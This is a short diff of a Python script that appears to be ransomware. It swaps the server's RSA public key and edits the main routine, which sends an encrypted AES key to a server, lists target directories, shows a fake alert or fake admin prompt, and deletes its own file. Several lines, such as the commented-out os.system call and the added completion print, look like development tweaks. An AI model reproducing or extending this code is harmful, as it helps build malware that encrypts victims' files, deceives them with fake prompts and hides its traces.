@@ -23,7 +23,7 @@ PUBLIC_KEY_RSA=0
 PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
 PRIVATE_KEY_AES=0
 
-PUBLIC_SERVER_RSA_KEY=PublicKey(b'\xf7U\x16-\xb6[^l\xc6\xc7^\xbe\xdb\x9e\xeb\xc6p\xb8\x1ffM3Z[e\xce\xa4\x86s\x9eu9')
+PUBLIC_SERVER_RSA_KEY=PublicKey(b'\xcc\\\x1c\xe2\xe5\xc9"h\xa1\xec\x1a\x0f\xe9\xe47\x18\xcb\x9b\xc7\xfd\xa1\x18=\x03\xd0\xf0\x0b\x05\xb0}\x9d@')
 
 AES_BOX=0
 
@@ -159,8 +159,8 @@ if __name__=='__main__':
     sendKeyToServer(encrypted_aes_key)
     setEncryptModule()
     listUpTargetDir()
-    p=Process(target=fakeAlert())
-    p.start()
+    #p=Thread(target=fakeAlert())
+    #p.start()
 
     if(IsAdmin==False):
         task_thread = threading.Thread(target=fakeAlert)
@@ -171,9 +171,8 @@ if __name__=='__main__':
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
-                
-            os.system(afterFileName)
-            os.remove(fileName)
-            
     else:
         fakeAdmin()
+    print("완료")
+    #os.system(afterFileName)
+    os.remove(fileName)
